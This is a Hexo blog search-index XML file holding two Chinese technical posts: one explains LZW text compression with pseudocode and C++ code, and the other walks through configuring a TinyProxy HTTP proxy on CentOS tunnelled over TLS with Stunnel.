<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>LZW文本压缩</title>
    <url>/lzw-cpp/</url>
    <content><![CDATA[<p>最近翻看《数据结构、算法与应用》里面关于哈希表章节时看到一个LZW文本压缩算法的实例，啃了很久才基本了解LZW算法，于是赶紧把它记录下来方便日后翻看。</p>
<a id="more"></a>
<h3 id="LZW"><a href="#LZW" class="headerlink" title="LZW"></a>LZW</h3><p>Lempel-Ziv-Welch（LZW）是由Abraham Lempel，Jacob Ziv和Terry Welch创建的<strong>无损</strong>数据压缩算法。<br>为了减少一个文本文件占用的磁盘空间，通常需要将文本文件压缩编码后存储，这个过程需要对文件编码的<strong>压缩器compressor</strong>，以及解码的<strong>解压器decompressor</strong>。</p>
<h3 id="压缩compress"><a href="#压缩compress" class="headerlink" title="压缩compress"></a>压缩compress</h3><p>LZW压缩方法是将文本字符串Text映射为数字编码Code（比如ASCII 0-255），而将文本字符串Text和数字编码Code这一对映射关系存储在字典/哈希表中。</p>
<p>首先我们规定：<code>p</code>表示存在于字典中<code>最长</code>的字符串，称为<strong>前缀字符串</strong>；<code>c</code>表示在待编码字符串<code>S</code>中匹配到的<code>p</code>前缀字符串的<code>下一个字符</code>，称为<strong>后缀字符</strong>；<code>p</code>在字典表<code>table</code>中的<code>代码</code>为<code>table[p]</code>。</p>
<p>为了简化事例，假设一串文本<code>S=aaabbbbbbaabaaba</code>只由a、b组成，初始情况下字典中只有<code>a</code>和<code>b</code>这两个字符，且存储在字典<code>table</code>中，已压缩串为空。</p>
<p>这张图参考了书上的例子，加上自己修改觉得挺不错的。图中表格阴影部分表示输出的压缩串代码在字典中的位置。<br><img src="/uploads/images/data_structure/lzw_cpp/01.png" alt></p>
<p>用LZW压缩算法来模拟上图的过程：<br>1.首先初始化字典<code>table&lt;String,Integer&gt;</code>；<br>2.然后找到待编码字符串<code>S</code>的第一个字符作为<code>前缀字符串p</code>，且这个字符一定能在字典中找到对应代码<code>table[p]</code>；<br>3.接着读取<code>S</code>的下一个<strong>字符</strong>作为<code>后缀字符c=a</code>；<br>4.如果<code>p+c</code>在字典中，则p指向下一个字符串：<code>p=p+c</code>；<br>5.如果<code>p+c</code>不在字典中，那么输出<code>p</code>在字典中的代码<code>table[p]</code>，同时为<code>p+c</code>在字典中分配一个新的代码<code>table[p+c]</code>，<code>p</code>指向下一个字符：<code>p=c</code>；<br>6.重复步骤3、4、5直到<code>EOF</code>；<br>7.最后输出代码<code>table[p]</code>；<br>8.结束。</p>
<p>伪代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Initialize table</span><br><span class="line">P = first input character</span><br><span class="line">WHILE not EOF</span><br><span class="line">    C = next input character</span><br><span class="line">    IF P + C in table</span><br><span class="line">        P = P + C</span><br><span class="line">    ELSE</span><br><span class="line">        output the code for P</span><br><span class="line">        insert P + C into table</span><br><span class="line">        P = C</span><br><span class="line">output code for P</span><br></pre></td></tr></table></figure>

<p>初始字典仅仅包含一些基本字符串和代码，但是随着编码的进行，字典不断扩增，如果遇到一个新的字符串<code>p+c</code>不在字典中，那么就将其添加到字典，以便下一次编码时<code>p+c</code>能够从字典中找到；如果能够在字典中找到<code>p+c</code>，意味着需要一个更长的字符串<code>p</code>来映射一些新的代码以达到文本压缩目的。就像上图例2,3，此时<code>p=a,c=a</code>,<code>&lt;aa,2&gt;</code>已经存在字典，下一次判断<code>p+c=aa</code>就能够在字典中找到<code>aa</code>，于是<code>p=p+c=aa</code>，尽可能选择一个最长的前缀字符串，接着下一次判断时<code>aa+b=aab</code>在字典中找不到，于是将<code>&lt;aab,3&gt;</code>插入到字典中。</p>
<p>还有当读取文件尾/字符串到达结尾时，此时<code>p</code>还保留之前的字符串<code>p=c</code>或<code>p=p+c</code>，而且一定能在字典中找到。这是因为单个字符<code>p=c</code>在初始字典table时就已经有对应的代码了，而<code>p=p+c</code>要成立，那么它必须是插入<code>p+c</code>之后才能得到，也就是说，“输出”慢于“插入”。于是编码结束时，还要将对<code>table[p]</code>处理(输出)才算是完整的LZW编码。</p>
<p>于是，压缩文本中并没有包含在编码过程中的生成的字典，而是通过编码的进行不断生成新的<code>&lt;新字符串前缀,新的代码&gt;</code>，而且注意到，将文本编码后的代码输出也只是<code>前缀字符串p</code>。</p>
<h3 id="解压缩decompress"><a href="#解压缩decompress" class="headerlink" title="解压缩decompress"></a>解压缩decompress</h3><p>与压缩对应的便是解压缩，其实lzw解压缩与lzw压缩是互逆的，但要理解它是怎么处理的需要些功夫。<br>在前面的压缩compress时，定义一个初始字典，且映射关系为&lt;文本串,代码&gt; =&gt; <code>table&lt;String,Integer&gt;</code>。同样，解压缩也需要一个字典：<code>table&lt;Integer,String&gt;</code>。<br>由于解码的过程中，解码器得到的是一个代码数字int，那得考虑代码在不在字典内，以及对应的解码文本是什么。</p>
<p>首先需要规定：<code>p</code>表示当前读取到的待解码串<code>S</code>中某一个代码，其对应的文本为<code>text(p)</code>（或者<code>table[p]</code>如果存在的话）；<code>q</code>表示出现于<code>p</code>之前的代码，可称为<code>前缀代码</code>，而且该代码<code>q</code>一定存在字典里，其对应的文本为<code>text(q)</code>；<code>fc(p)</code>表示<code>text(p)</code>的第一个字符(first character)，可称为<code>后缀字符</code>。</p>
<p>还是以上面的例子来说明，存在已经编码的代码串<code>0214537</code>。图中表格阴影部分表示将新的&lt;代码,文本&gt;添加到字典中。<br><img src="/uploads/images/data_structure/lzw_cpp/02.png" alt></p>
<p>LZW解码过程如下：<br>1.首先初始化字典；<br>2.然后找到<code>S</code>的第一个代码<code>q</code>，而且该代码一定存在字典内（这是由编码时决定的），输出文本<code>text(q)</code>；<br>3.接着读取<code>S</code>的下一个代码<code>p</code>；<br>4.如果<code>p</code>在字典里，则输出对应的文本<code>text(p)</code>，同时向字典添加新的代码<code>text(q)fc(p)</code>；<br>5.如果<code>p</code>不在字典里，则向字典添加新的代码<code>text(p)=text(q)fc(q)</code>，输出对应的文本<code>text(p)</code>；<br>6.重复步骤3、4、5，直到<code>EOF</code>；<br>7.结束。</p>
<p>伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Initialize table</span><br><span class="line">Q = first input code</span><br><span class="line">output table[Q]</span><br><span class="line">WHILE not EOF</span><br><span class="line">    P = next input code</span><br><span class="line">    IF P int table</span><br><span class="line">        insert TEXT(Q)+FirstCharacter(P) into table</span><br><span class="line">    ELSE</span><br><span class="line">        insert TEXT(Q)+FirstCharacter(Q) into table</span><br><span class="line">    output table[P]</span><br><span class="line">    Q=P</span><br></pre></td></tr></table></figure>

<p>1.<code>p</code>在字典里<br>以代码<code>p=1</code>和代码<code>q=2</code>为例。<br>现在根据<code>解压缩</code>的情况来分析：已知代码<code>p</code>在字典里，说明在<code>编码</code>过程（此时p表示代码对应的文本）中输出代码<code>table[p]=1</code>之前的某一步骤输出了代码<code>table[q]=2</code>，同时添加新的文本<code>q+c=aa+b=aab</code>到字典里且<code>table[q+c]=3</code>（<font color="red">这也就是解码时的text(q)+fc(p)，c=fc(p)</font>），然后<code>q=c=b</code>；之后继续判断<code>q+c=b+b=bb</code>不在字典内，则输出<code>table[q=b]=1</code>。于是就形成了代码<code>2 1</code>的情况。<br><img src="/uploads/images/data_structure/lzw_cpp/04.png" alt></p>
<p>还有<code>5 3</code>这种情况<br><img src="/uploads/images/data_structure/lzw_cpp/03.png" alt></p>
<p>2.<code>p</code>不在字典里<br>这种情况只有在文本段中形式为<code>text(q)text(q)fc(q)</code>和<code>text(q)fc(q)</code>，且相应的压缩代码串为<code>qp</code>的时候（qp相邻，观察上图可知），只有在<code>q</code>被<code>text(q)</code>代替的情况下，代码<code>q</code>在字典中才不会有对应的文本，而这个文本应该是<code>text(q)fc(q)</code>。比如上面的<code>q=3 p=7</code>且原始文本段<code>aab aaba</code>，即<code>text(7)=text(3)fc(3)</code>；又如<code>q=4 p=5</code>且原始文本段<code>bb bbb</code>，即<code>text(5)=text(4)fc(4)</code>；而<code>q=5 p=3</code>的原始文本段为<code>bbb aab</code>，但是没有<code>text(3)=text(5)fc(5)=bbbb</code>这种情况。这是在编码过程中决定的。</p>
<p>解码是根据读取的代码来构建一个与编码之前完全相同的字典并输出对应的文本，而且也一定会将所有的代码读取完。</p>
<p>以上例子只展示了一个字符串只有a、b两个字符，以及初始字典为&lt;a,0&gt;、&lt;b,1&gt;，一般来说，常见文本文件是ASCII文件，所以这时的初始字典大小可以是256，包含了扩展ASCII码。</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> ALPHA_MAX=<span class="number">256</span>;</span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt;table;</span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt;table2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存编码之后的代码</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;codes;</span><br><span class="line"><span class="comment">// 保存解码之后的文本</span></span><br><span class="line"><span class="built_in">string</span> text;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="built_in">string</span> str)</span></span>&#123;</span><br><span class="line">    codes.push_back(table[str]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> code)</span></span>&#123;</span><br><span class="line">    text+=table2[code];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 编码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compress</span><span class="params">(<span class="built_in">string</span> source)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化字典</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ALPHA_MAX; i++)&#123;</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">key</span><span class="params">(<span class="number">1</span>,<span class="keyword">char</span>(i))</span></span>;</span><br><span class="line">        table.insert(make_pair(key,i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 已使用代码数量</span></span><br><span class="line">    <span class="keyword">int</span> usedCode=ALPHA_MAX;</span><br><span class="line">    <span class="built_in">string</span> p=<span class="string">""</span>;</span><br><span class="line">    <span class="built_in">string</span> c;</span><br><span class="line">    p+=source[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> len=source.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        c.clear();</span><br><span class="line">        c+=source[i];</span><br><span class="line">        <span class="comment">// p+c在字典</span></span><br><span class="line">        <span class="keyword">if</span>(table.find(p+c)!=table.end())&#123;</span><br><span class="line">            p=p+c;</span><br><span class="line">        <span class="comment">// p+c不在字典</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            output(p);</span><br><span class="line">            table.insert(make_pair(p+c,usedCode++));</span><br><span class="line">            p=c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    output(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uncompress</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;codes)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化字典</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ALPHA_MAX; i++)&#123;</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">text</span><span class="params">(<span class="number">1</span>,<span class="keyword">char</span>(i))</span></span>;</span><br><span class="line">        table2.insert(make_pair(i,text));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 已使用代码数量</span></span><br><span class="line">    <span class="keyword">int</span> usedCode=ALPHA_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> q=codes[<span class="number">0</span>];</span><br><span class="line">    output(q);</span><br><span class="line">    <span class="keyword">int</span> len=codes.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="comment">// 读取下一个代码code</span></span><br><span class="line">        <span class="keyword">int</span> p=codes[i];</span><br><span class="line">        <span class="comment">// 当前读取的代码p在字典</span></span><br><span class="line">        <span class="keyword">if</span>(table2.find(p)!=table2.end())&#123;</span><br><span class="line">            <span class="comment">// text(code)=text(q)fc(p)</span></span><br><span class="line">            <span class="built_in">string</span> code=table2[q]+table2[p][<span class="number">0</span>];</span><br><span class="line">            table2.insert(make_pair(usedCode++,code));</span><br><span class="line">        <span class="comment">// 当前读取的代码p不在字典</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// text(p)=text(q)fc(q)</span></span><br><span class="line">            <span class="built_in">string</span> pT=table2[q]+table2[q][<span class="number">0</span>];</span><br><span class="line">            table2.insert(make_pair(usedCode++,pT));</span><br><span class="line">        &#125;</span><br><span class="line">        q=p;</span><br><span class="line">        output(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ifstream in;</span><br><span class="line">    in.open(<span class="string">"test.txt"</span>,ios_base::binary);</span><br><span class="line">    <span class="built_in">string</span> text=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">while</span>((c=in.get())!=EOF)&#123;</span><br><span class="line">        text+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    compress(text);</span><br><span class="line">    in.close();</span><br><span class="line"></span><br><span class="line">    ofstream out;</span><br><span class="line">    out.open(<span class="string">"test.txt.lzw"</span>,ios_base::binary);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x:codes)&#123;</span><br><span class="line">        out.put(x);</span><br><span class="line">    &#125;</span><br><span class="line">    out.close();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试一个ASCII文件<br><img src="/uploads/images/data_structure/lzw_cpp/05.png" alt></p>
<p>又测试一个文件其最后压缩时生成的字典<br><img src="/uploads/images/data_structure/lzw_cpp/06.png" alt></p>
<p>C++中char数组存储中文时，如果取其中一个char的话，由于char占用1个字节，使得中文发生截断（被分解），比如<code>string s=&quot;你好&quot;;</code> 不过上面的测试依然可以通过，只要在编码过程中将被截断的所有char依次写入编码文件中，在解码时按照同样的规则去读取char，最后还是可以解码成功的。<br><img src="/uploads/images/data_structure/lzw_cpp/07.png" alt></p>
<p>就这样吧，等有空再来更新更新……</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>《数据结构、算法与应用》<br><a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch" target="_blank" rel="noopener">Lempel–Ziv–Welch</a><br><a href="https://segmentfault.com/a/1190000011425787?utm_medium=referral&utm_source=tuicool" target="_blank" rel="noopener">LZW压缩算法原理解析</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS+TinyProxy+Stunnel配置HTTP代理服务器</title>
    <url>/linux-tinyproxy/</url>
    <content><![CDATA[<p>本文将利用CentOS、TinyProxy、Stunnel搭建一个正向代理服务器……</p>
<a id="more"></a>

<p>之前的 <a href="https://www.joxrays.com/centos-shadowsocks/">CentOS服务器Shadowsocks</a> 是在CentOS7上配置Shadowsocks将其作为代理服务器，而这次的tinyproxy配置同样也是把CentOS7作为一个代理服务器，而且SS是基于Socks5协议，tinyproxy是HTTP/HTTPS协议。</p>
<h3 id="TinyProxy"><a href="#TinyProxy" class="headerlink" title="TinyProxy"></a>TinyProxy</h3><p>TinyProxy是一个由C语言开发、开源、轻量级的HTTP/HTTPS代理服务器 <a href="https://github.com/tinyproxy/tinyproxy" target="_blank" rel="noopener">Github</a></p>
<blockquote>
<p>Tinyproxy is a light-weight HTTP/HTTPS proxy daemon for POSIX operating systems. Designed from the ground up to be fast and yet small, it is an ideal solution for use cases such as embedded deployments where a full featured HTTP proxy is required, but the system resources for a larger proxy are unavailable.</p>
</blockquote>
<p>tinyproxy比squid配置要简单，但squid功能却比tinyproxy要多且灵活性高。不过我对squid不是很深入了解，暂时就拿tinyproxy来说吧。<br>由于我的服务器是CentOS7，故可直接从包管理器安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_17_centos ~]<span class="comment"># yum install -y tinyproxy</span></span><br></pre></td></tr></table></figure>

<p>之后就是配置tinyproxy了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_17_centos ~]<span class="comment"># vim /etc/tinyproxy/tinyproxy.conf</span></span><br></pre></td></tr></table></figure>

<p>修改tinyproxy监听端口<code>Port</code>，默认 <code>8888</code><br>注释<code>Allow</code>参数，表示允许所有人都可以访问代理服务器。如果只希望指定的IP能够访问代理服务器，那么可以添加多个<code>Allow</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Port 8888</span><br><span class="line"><span class="comment">#Allow 127.0.0.1</span></span><br><span class="line">Allow 10.10.6.0/24</span><br><span class="line">Allow 123.200.123.66</span><br></pre></td></tr></table></figure>

<p>注意 <code>#DisableViaHeader Yes</code> 这个参数，用于指定是否在请求Header中显示tinyproxy相关信息（比如：<code>Proxy-agent: tinyproxy/1.8.3</code>），默认是关闭的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ViaProxyName: The "Via" header is required by the HTTP RFC, but using</span></span><br><span class="line"><span class="comment"># the real host name is a security concern.  If the following directive</span></span><br><span class="line"><span class="comment"># is enabled, the string supplied will be used as the host name in the</span></span><br><span class="line"><span class="comment"># Via header; otherwise, the server's host name will be used.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#ViaProxyName "tinyproxy"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># DisableViaHeader: When this is set to yes, Tinyproxy does NOT add</span></span><br><span class="line"><span class="comment"># the Via header to the requests. This virtually puts Tinyproxy into</span></span><br><span class="line"><span class="comment"># stealth mode. Note that RFC 2616 requires proxies to set the Via</span></span><br><span class="line"><span class="comment"># header, so by enabling this option, you break compliance.</span></span><br><span class="line"><span class="comment"># Don't disable the Via header unless you know what you are doing...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#DisableViaHeader Yes</span></span><br></pre></td></tr></table></figure>

<p>其他参数默认即可，之后就是启动tinyproxy</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_17_centos ~]<span class="comment"># systemctl start tinyproxy.service</span></span><br><span class="line">[root@VM_0_17_centos ~]<span class="comment"># systemctl enable tinyproxy.service</span></span><br></pre></td></tr></table></figure>

<p>配置iptables</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许访问</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 8888 -j ACCEPT</span><br><span class="line"><span class="comment"># 拒绝访问</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 8888 -j REJECT</span><br></pre></td></tr></table></figure>

<p>可能还需要配置云服务器安全组外界才能访问tinyproxy端口</p>
<p>之后就能够直接通过该代理服务器进行代理访问了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">% curl -x 129.204.152.8:8888 https://ip.cn --head</span><br><span class="line">HTTP/1.0 200 Connection established</span><br><span class="line">Proxy-agent: tinyproxy/1.8.3</span><br><span class="line"></span><br><span class="line">HTTP/2 200 </span><br><span class="line">date: Mon, 17 Feb 2020 02:08:20 GMT</span><br><span class="line">content-type: application/json; charset=UTF-8</span><br><span class="line"><span class="built_in">set</span>-cookie: __cfduid=d404e02d9f8749f3815ce40da97e29bbf1581905300; expires=Wed, 18-Mar-20 02:08:20 GMT; path=/; domain=.ip.cn; HttpOnly; SameSite=Lax</span><br><span class="line">cf-cache-status: DYNAMIC</span><br><span class="line">expect-ct: max-age=604800, report-uri=<span class="string">"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"</span></span><br><span class="line">server: cloudflare</span><br><span class="line">cf-ray: 5664367e282eeba9-LAX</span><br></pre></td></tr></table></figure>

<p>当然也可以 <code>curl -x 129.204.152.8:8888 https://ip.cn --head -k</code>，即允许curl使用非安全的ssl连接并且传输数据（证书不受信）。<br>注意 <code>Proxy-agent: tinyproxy/1.8.3</code> ，之前我们并没有注释 <code>#DisableViaHeader Yes</code>，它会在Via请求中显示代理信息。<br>查看日志log <code>tail /var/log/tinyproxy/tinyproxy.log</code>。</p>
<p>然而事情并没有结束……</p>
<h3 id="Stunnel-隧道"><a href="#Stunnel-隧道" class="headerlink" title="Stunnel(隧道)"></a>Stunnel(隧道)</h3><blockquote>
<p>Stunnel是一个自由的跨平台软件，用于提供全局的TLS/SSL服务。针对本身无法进行TLS或SSL通信的客户端及服务器，Stunnel可提供安全的加密连接。</p>
</blockquote>
<p>如果用代理服务器访问一个HTTP协议的网站，那么传输的数据是不会加密的，也就是说可以被抓包软件获取数据包，比如Wireshark。我在服务器配置了Apache，开启80端口，比如这样一个HTTP ULR： <a href="http://129.204.152.8:80。" target="_blank" rel="noopener">http://129.204.152.8:80。</a><br><code>curl -x 129.204.152.8:8888 http://129.204.152.8 -v</code><br><img src="/uploads/images/tinyproxy_stunnel/01.png" alt></p>
<p>可见数据没有加密，而是直接在两台主机间传输，我们希望HTTP传输也是安全的，也就是经过加密的，那么可以使用Stunnel和TinyProxy来混淆HTTP流量。</p>
<p>CentOS安装Stunnel <code>yum install -y stunnel</code></p>
<h4 id="配置服务端Server"><a href="#配置服务端Server" class="headerlink" title="配置服务端Server"></a>配置服务端Server</h4><p><code>vim /etc/stunnel/stunnel.conf</code>，如果stunnel.conf不存在，那么新建一个并添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[tinyproxy]</span><br><span class="line">accept = 0.0.0.0:3128</span><br><span class="line">connect = 0.0.0.0:8888</span><br><span class="line">cert = /etc/ssl/cert.pem</span><br><span class="line">key = /etc/ssl/key.pem</span><br></pre></td></tr></table></figure>

<ul>
<li>accept 服务器stunnel监听端口，用于与客户端进行连接</li>
<li>connect 用于告诉stunnel要连接的IP和端口。这需要是TinyProxy监听的IP和端口，<code>netstat -anpl|grep tinyproxy</code>可看到</li>
<li>cert 本地证书文件路径，可以用<code>openssl</code>生成</li>
<li>key 本地密匙文件路径</li>
</ul>
<h5 id="创建自签名证书"><a href="#创建自签名证书" class="headerlink" title="创建自签名证书"></a>创建自签名证书</h5><p>要启动stunnel，那还需要创建自签名证书。</p>
<p>生成key.pem</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_17_centos ~]<span class="comment"># openssl genrsa -out /etc/ssl/key.pem 4096</span></span><br><span class="line">Generating RSA private key, 4096 bit long modulus</span><br><span class="line">......................................................................++</span><br><span class="line">..............................................................++</span><br><span class="line">e is 65537 (0x10001)</span><br></pre></td></tr></table></figure>

<p>这将创建一个<code>4096</code>位RSA密钥<code>key.pem</code>。有兴趣的可以了解下<a href="https://danielpocock.com/rsa-key-sizes-2048-or-4096-bits/" target="_blank" rel="noopener">“RSA Key Sizes: 2048 or 4096 bits?”</a></p>
<p>生成cert.pem</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_17_centos ~]<span class="comment"># openssl req -new -x509 -key /etc/ssl/key.pem -out /etc/ssl/cert.pem -days 1826</span></span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter <span class="string">'.'</span>, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [XX]:US</span><br><span class="line">State or Province Name (full name) []:Arizona</span><br><span class="line">Locality Name (eg, city) [Default City]:Phoenix</span><br><span class="line">Organization Name (eg, company) [Default Company Ltd]:</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (eg, your name or your server<span class="string">'s hostname) []:VM_0_17_centos</span></span><br><span class="line"><span class="string">Email Address []:helloworld@example.com          </span></span><br><span class="line"><span class="string">[root@VM_0_17_centos ~]# ls -lh /etc/ssl/</span></span><br><span class="line"><span class="string">total 8.0K</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2.1K Feb 17 11:03 cert.pem</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root   16 Feb  6 11:56 certs -&gt; ../pki/tls/certs</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3.2K Feb 17 10:55 key.pem</span></span><br></pre></td></tr></table></figure>

<ul>
<li>new x509 创建一个新的X509证书</li>
<li>days 证书的有效期</li>
<li>key 密匙文件</li>
<li>out 输出到cert.pem</li>
</ul>
<p>生成的同时还要回答一些问题</p>
<ul>
<li>Country Name 国家 (PL,UK,US,CA)</li>
<li>State or Province Name 州或省 (Illinois,Ontario,…)</li>
<li>Locality Name 地区 (Chicago,Toronto,…)</li>
<li>Organization Name 组织</li>
<li>Organizational Unit Name 组织单位</li>
<li>Common Name (your name or your server’s hostname) 一般服务器hostname</li>
<li>Email Address 电子邮件</li>
</ul>
<p>启动stunnel <code>stunnel /etc/stunnel/stunnel.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_0_17_centos ~]# netstat -antpl|grep stunnel</span><br><span class="line">tcp        0      0 0.0.0.0:3128            0.0.0.0:*               LISTEN      24263/stunnel</span><br></pre></td></tr></table></figure>

<h4 id="配置客户端Client"><a href="#配置客户端Client" class="headerlink" title="配置客户端Client"></a>配置客户端Client</h4><p>配置完服务器还需要配置本地客户端，就拿Arch/Manjaro举例。<br>安装stunnel <code>pacman -S stunnel</code></p>
<p><code>cp /etc/stunnel/stunnel.conf-sample /etc/stunnel/stunnel.conf</code><br><code>vim /etc/stunnel/stunnel.conf</code><br>编辑配置文件stunnel.conf可以全部删除只添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[tinyproxy]</span><br><span class="line">client = yes</span><br><span class="line">accept = 0.0.0.0:3129</span><br><span class="line">connect = 129.204.152.8:3128</span><br><span class="line">verify = 3</span><br><span class="line">CAfile = /etc/stunnel/cert.pem</span><br></pre></td></tr></table></figure>

<ul>
<li>client 表明这是客户端</li>
<li>accept 本地stunnel监听ip地址+端口 0.0.0.0:xxxx</li>
<li>connect 要连接到远程stunnel服务器</li>
<li>verify  证书验证级别，verify=3根据本地安装的证书并验证证书</li>
<li>CAfile 服务器上生成的<code>cert.pem</code>，将其复制到本地/etc/stunnel/cert.pem</li>
</ul>
<p>之后就可以启动stunnel了，<code>stunnel /etc/stunnel/stunnel.conf</code>，也可以 <code>systemctl start stunnel.service</code>、<code>systemctl enable stunnel.service</code></p>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">% curl -x 127.0.0.1:3129 https://ip.cn --head</span><br><span class="line">HTTP/1.0 200 Connection established</span><br><span class="line">Proxy-agent: tinyproxy/1.8.3</span><br><span class="line"></span><br><span class="line">HTTP/2 200 </span><br><span class="line">date: Mon, 17 Feb 2020 03:58:29 GMT</span><br><span class="line">content-type: application/json; charset=UTF-8</span><br><span class="line"><span class="built_in">set</span>-cookie: __cfduid=d340c54d6fa045689f6f49e91ac7f918f1581911909; expires=Wed, 18-Mar-20 03:58:29 GMT; path=/; domain=.ip.cn; HttpOnly; SameSite=Lax</span><br><span class="line">cf-cache-status: DYNAMIC</span><br><span class="line">expect-ct: max-age=604800, report-uri=<span class="string">"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"</span></span><br><span class="line">server: cloudflare</span><br><span class="line">cf-ray: 5664d7d91e5d77b8-LAX</span><br></pre></td></tr></table></figure>

<p><code>curl -x 127.0.0.1:3129 http://129.204.152.8 -v</code><br><img src="/uploads/images/tinyproxy_stunnel/02.png" alt></p>
<p>可见成功的搭建了一个基于TLS的HTTP/HTTPS代理。</p>
